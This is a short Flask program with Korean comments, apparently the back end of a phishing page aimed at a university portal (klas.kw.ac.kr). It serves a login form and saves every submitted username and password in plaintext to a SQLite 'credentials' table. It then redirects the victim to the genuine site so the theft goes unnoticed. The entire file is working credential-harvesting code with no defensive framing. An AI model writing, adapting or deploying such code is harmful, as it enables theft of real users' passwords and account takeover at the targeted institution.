from flask import Flask, render_template, request, redirect
import sqlite3

app = Flask(__name__, static_url_path='/static')

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    # 저장
    conn = sqlite3.connect('credentials.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    c.execute("INSERT INTO credentials (username, password) VALUES (?, ?)", (username, password))
    conn.commit()
    conn.close()

    # 리디렉션
    return redirect("https://klas.kw.ac.kr")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
